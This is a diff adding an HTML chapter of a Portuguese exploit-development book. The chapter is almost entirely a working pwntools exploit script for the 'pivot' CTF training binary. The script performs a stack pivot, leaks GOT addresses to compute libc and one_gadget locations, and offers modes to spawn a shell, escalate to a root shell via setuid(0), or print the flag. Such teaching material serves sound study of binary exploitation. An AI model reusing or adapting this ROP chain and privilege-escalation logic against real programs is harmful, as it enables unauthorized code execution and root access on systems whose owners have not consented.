@@ -1,0 +1,330 @@
+<!DOCTYPE HTML>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <title>ROPE: pivot - Um Livrinho Sobre Exploit Dev</title>
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+
+        <base href="../../../">
+
+        <link rel="stylesheet" href="book.css">
+        <link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css">
+        <link href="https://fonts.googleapis.com/css?family=Source+Code+Pro:500" rel="stylesheet" type="text/css">
+
+        <link rel="shortcut icon" href="favicon.png">
+
+        <!-- Font Awesome -->
+        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
+
+        <link rel="stylesheet" href="highlight.css">
+        <link rel="stylesheet" href="tomorrow-night.css">
+        <link rel="stylesheet" href="ayu-highlight.css">
+
+        <!-- Custom theme -->
+        
+
+        
+
+        <!-- Fetch Clipboard.js from CDN but have a local fallback -->
+        <script src="https://cdn.jsdelivr.net/clipboard.js/1.6.1/clipboard.min.js"></script>
+        <script>
+            if (typeof Clipboard == 'undefined') {
+                document.write(unescape("%3Cscript src='clipboard.min.js'%3E%3C/script%3E"));
+            }
+        </script>
+
+        <!-- Fetch JQuery from CDN but have a local fallback -->
+        <script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+        <script>
+            if (typeof jQuery == 'undefined') {
+                document.write(unescape("%3Cscript src='jquery.js'%3E%3C/script%3E"));
+            }
+        </script>
+
+        <!-- Fetch store.js from local - TODO add CDN when 2.x.x is available on cdnjs -->
+        <script src="store.js"></script>
+
+    </head>
+    <body class="light">
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script type="text/javascript">
+            var theme = store.get('mdbook-theme');
+            if (theme === null || theme === undefined) { theme = 'light'; }
+            $('body').removeClass().addClass(theme);
+        </script>
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script type="text/javascript">
+            var sidebar = store.get('mdbook-sidebar');
+            if (sidebar === "hidden") { $("html").addClass("sidebar-hidden") }
+            else if (sidebar === "visible") { $("html").addClass("sidebar-visible") }
+        </script>
+
+        <div id="sidebar" class="sidebar">
+            <ul class="chapter"><li><a href="./mapa.html"><strong>1.</strong> Mapa</a></li><li class="spacer"></li><li><a href="./stack/phoenix/setup.html"><strong>2.</strong> Phoenix Stack</a></li><li><ul class="section"><li><a href="./stack/phoenix/StackZero.html"><strong>2.1.</strong> Stack Zero</a></li><li><a href="./stack/phoenix/StackOne.html"><strong>2.2.</strong> Stack One</a></li><li><a href="./stack/phoenix/StackTwo.html"><strong>2.3.</strong> Stack Two</a></li><li><a href="./stack/phoenix/StackThree.html"><strong>2.4.</strong> Stack Three</a></li><li><a href="./stack/phoenix/StackFour.html"><strong>2.5.</strong> Stack Four</a></li><li><a href="./stack/phoenix/StackFive.html"><strong>2.6.</strong> Stack Five</a></li><li><a href="./stack/phoenix/StackSix.html"><strong>2.7.</strong> Stack Six</a></li></ul></li><li><strong>3.</strong> Estilo OSCP</li><li><ul class="section"><li><strong>3.1.</strong> Brainpan</li><li><strong>3.2.</strong> Tib3rius BOF Prep</li></ul></li><li><a href="./stack/mitigacoes.html"><strong>4.</strong> Mitigações</a></li><li><strong>5.</strong> from pwn import *</li><li><a href="./stack/ret2libc/intro.html"><strong>6.</strong> Ret2LibC</a></li><li><ul class="section"><li><strong>6.1.</strong> Protostar Stack Six: ret2libc</li><li><strong>6.2.</strong> Avançado: Múltiplos ret2libc</li></ul></li><li><a href="./stack/rop/intro.html"><strong>7.</strong> ROP</a></li><li><ul class="section"><li><a href="./stack/rop/primitivos.html"><strong>7.1.</strong> Primitivos</a></li><li><ul class="section"><li><a href="./stack/rop/ROPE/dump.html"><strong>7.1.1.</strong> ROPE</a></li></ul></li><li><strong>7.2.</strong> Pivot</li><li><ul class="section"><li><a href="./stack/rop/ROPE/pivot.html" class="active"><strong>7.2.1.</strong> ROPE: pivot</a></li></ul></li><li><strong>7.3.</strong> ROP + ret2libc</li><li><a href="./stack/rop/SROP/SROP.html"><strong>7.4.</strong> SROP</a></li><li><ul class="section"><li><strong>7.4.1.</strong> Sem Leaks</li></ul></li></ul></li><li><strong>8.</strong> Derrotando ASLR</li><li><strong>9.</strong> Derrotando Canaries</li><li class="spacer"></li><li><strong>10.</strong> Teoria</li><li><strong>11.</strong> Básico</li><li><ul class="section"><li><strong>11.1.</strong> Fastbins Dup</li><li><a href="./heap/basico/HouseOfForce.html"><strong>11.2.</strong> House of Force</a></li><li><strong>11.3.</strong> Unsafe Unlink</li><li><strong>11.4.</strong> Safe Unlink</li><li><strong>11.5.</strong> Unsorted bins: Partial Unlink</li><li><strong>11.6.</strong> Chunk Faking</li></ul></li><li><strong>12.</strong> Intermediário</li><li><ul class="section"><li><strong>12.1.</strong> House of Orange</li><li><ul class="section"><li><strong>12.1.1.</strong> Heap Extension</li><li><strong>12.1.2.</strong> Vtable + File Stream Exploitation</li><li><strong>12.1.3.</strong> Unindo tudo isso!</li></ul></li><li><strong>12.2.</strong> House of Spirit</li></ul></li><li><strong>13.</strong> Avançado</li><li><ul class="section"><li><strong>13.1.</strong> House of Rust</li><li class="spacer"></li></ul></li><li><strong>14.</strong> Intro AFL</li></ul>
+        </div>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page" tabindex="-1">
+                
+                <div id="menu-bar" class="menu-bar">
+                    <div class="left-buttons">
+                        <i id="sidebar-toggle" class="fa fa-bars" title="Toggle sidebar"></i>
+                        <i id="theme-toggle" class="fa fa-paint-brush" title="Change theme"></i>
+                    </div>
+
+                    <h1 class="menu-title">Um Livrinho Sobre Exploit Dev</h1>
+
+                    <div class="right-buttons">
+                        <a href="print.html">
+                            <i id="print-button" class="fa fa-print" title="Print this book"></i>
+                        </a>
+                    </div>
+                </div>
+
+                <div id="content" class="content">
+                    <a class="header" href="./stack/rop/ROPE/pivot.html#pivot" id="pivot"><h1>Pivot</h1></a>
+<pre><code class="language-py">#!/usr/bin/python3
+from pwn import *
+from time import sleep
+
+# --------------------------------------------------  
+# Inicializar
+# --------------------------------------------------  
+if args.LOG: context.log_level = &quot;info&quot;
+else       : context.log_level = &quot;critical&quot;
+
+binary = ELF(&quot;pivot&quot;)
+libc = binary.libc
+
+io = process(binary.path)
+io.recvuntil(&quot;pivot: &quot;)
+leak = int(io.recv(14)[2::],16)
+log.info(&quot;Leak: &quot;+hex(leak))
+
+io.recvuntil(&quot;&gt; &quot;)
+
+# --------------------------------------------------  
+# Gadgets
+# --------------------------------------------------
+# Misc
+pop_rdi = p64(0x0000000000400a33) 
+pop_rax = p64(0x00000000004009bb)
+pop_rbp = p64(0x00000000004007c8)
+add_rax_rbp = p64(0x00000000004009c4) 
+pop_rsi_r15 = p64(0x0000000000400a31) 
+
+
+# Pivot
+xchg_rsp = p64(0x00000000004009bd) # xchg rax, rsp; ret; 
+
+# Read
+mov_eax_rax = p64(0x00000000004009c1) # mov eax, dword ptr [rax]; ret;
+
+# Exec
+call_rax = p64(0x00000000004006b0) # call rax; depois coloca um lixin p64 
+pop_r12_13_14_15 = p64(0x0000000000400a2c) 
+one_gadget = 0xcbd1a
+# 0xcbd1a execve(&quot;/bin/sh&quot;, r12, r13)
+# constraints:
+ # [r12] == NULL || r12 == NULL
+ # [r13] == NULL || r13 == NULL
+
+# --------------------------------------------------  
+# Primeira Fase
+# --------------------------------------------------  
+fase1 = b&quot;&quot;
+fase1 += b&quot;B&quot;*40
+fase1 += pop_rax   
+fase1 += p64(leak) # leak == fase2
+fase1 += xchg_rsp  # rsp == fase2
+
+# Entao, caso coloquemos uma ROP chain no leak, ela sera executada
+
+# --------------------------------------------------  
+# Segunda Fase
+# --------------------------------------------------  
+def get_shell():
+    fase2 = b''
+    # Ler a got de puts
+    fase2 += pop_rax 
+    fase2 += p64(binary.got.puts)
+    fase2 += mov_eax_rax # mov eax [rax]
+
+    # agora temos o FINAL de puts em rax
+    # inicio do puts == ao do leak
+    # Entao podemos calcular o resto dele a partir do leak
+    # leak  = 0x7fb5       27 4a 9f 10 
+    # final = 0x           27 52 45 f0
+    # (leak &gt;&gt; 4*8  &lt;&lt; 4*8) + final_puts == puts
+    # 0x7fb500000000 + final_puts = 0x7fb5275245f0 (puts)
+
+    # calcular o endereco do one_gadget usando puts como referencia
+    fase2 += pop_rbp
+    fase2 += p64( (leak &gt;&gt; 4*8 &lt;&lt; 4*8) - (libc.sym.puts - one_gadget) )
+    fase2 += add_rax_rbp
+        # lembrete: libc.sym e um  offset dentro do libc (e o one_gadget tambem)
+
+    # one gadget constraints r12 r13 == NULL
+    fase2 += pop_r12_13_14_15
+    fase2 += p64(0)*4 
+    fase2 += call_rax
+
+    return fase2
+
+def privesc():
+    setuid = b''
+    # Ler a got de puts
+    setuid += pop_rax
+    setuid += p64(binary.got.puts)
+    setuid += mov_eax_rax # mov eax [rax]
+    
+    # calcular o endereco de setuid usando puts como referencia
+    setuid += pop_rbp
+    setuid += p64( (leak &gt;&gt; 4*8 &lt;&lt; 4*8) - (libc.sym.puts - libc.sym.setuid) )
+    setuid += add_rax_rbp
+
+    setuid += pop_rdi
+    setuid += p64(0)
+    setuid += call_rax
+    setuid += p64(0)
+
+    return setuid
+
+def foothold():
+    libpivot = ELF(&quot;libpivot.so&quot;)
+
+    # Executar foothold_function para popular o got
+    challenge = b''
+    challenge += pop_rax
+    challenge += p64(binary.plt.foothold_function)
+    challenge += call_rax
+    challenge += p64(0)
+
+    # Ler a got de foothold_function
+    challenge += pop_rax
+    challenge += p64(binary.got.foothold_function)
+    challenge += mov_eax_rax # mov eax [rax]
+    
+    # calcular o endereco de ret2win usando foothold como referencia
+    challenge += pop_rbp
+    challenge += p64( (leak &gt;&gt; 4*8 &lt;&lt; 4*8) - (libpivot.sym.foothold_function - libpivot.sym.ret2win) )
+    challenge += add_rax_rbp
+
+    challenge += call_rax
+    challenge += p64(0)
+
+    return challenge
+
+# --------------------------------------------------  
+# :D
+# --------------------------------------------------  
+log.critical('''
+ARGV modos:
+    SHELL  - shell
+    PRIV   - root shell
+    CTF    - print flag 
+
+ARGV debug: 
+    SLEEP  - 5 seg
+    LOG    - log verboso
+''')
+
+if args.SLEEP: sleep(5)
+
+if args.CTF:
+    fase2 = foothold()
+elif args.PRIV:
+    fase2 = privesc() + get_shell()
+elif args.SHELL:
+    fase2 = get_shell()
+else:
+    log.critical(&quot;Por favor, selecione um modo&quot;)
+    quit()
+
+io.sendline(fase2)
+io.recvuntil(&quot;&gt; &quot;)
+
+io.sendline(fase1)
+
+if args.CTF:
+    io.recvuntil(&quot;libpivot\n&quot;)
+    log.critical(io.recv(128))
+else:
+    io.recvuntil(&quot;!\n&quot;)
+    io.interactive()
+</code></pre>
+
+                </div>
+
+                <!-- Mobile navigation buttons -->
+                
+                    <a rel="prev" href="./stack/rop/ROPE/dump.html" class="mobile-nav-chapters previous" title="Previous chapter">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+                
+
+                
+                    <a rel="next" href="./stack/rop/SROP/SROP.html" class="mobile-nav-chapters next" title="Next chapter">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+                
+
+            </div>
+
+            
+                <a href="./stack/rop/ROPE/dump.html" class="nav-chapters previous" title="You can navigate through the chapters using the arrow keys">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+            
+
+            
+                <a href="./stack/rop/SROP/SROP.html" class="nav-chapters next" title="You can navigate through the chapters using the arrow keys">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+            
+
+        </div>
+
+
+        <!-- Local fallback for Font Awesome -->
+        <script>
+            if ($(".fa").css("font-family") !== "FontAwesome") {
+                $('<link rel="stylesheet" type="text/css" href="_FontAwesome/css/font-awesome.css">').prependTo('head');
+            }
+        </script>
+
+        <!-- Livereload script (if served using the cli tool) -->
+        
+    <script type="text/javascript">
+        var socket = new WebSocket("ws://localhost:3001");
+        socket.onmessage = function (event) {
+            if (event.data === "reload") {
+                socket.close();
+                location.reload(true); // force reload from server (not from cache)
+            }
+        };
+
+        window.onbeforeunload = function() {
+            socket.close();
+        }
+    </script>
+
+
+        
+
+        
+
+        
+
+        <script src="highlight.js"></script>
+        <script src="book.js"></script>
+
+        <!-- Custom JS script -->
+        
+
+    </body>
+</html>
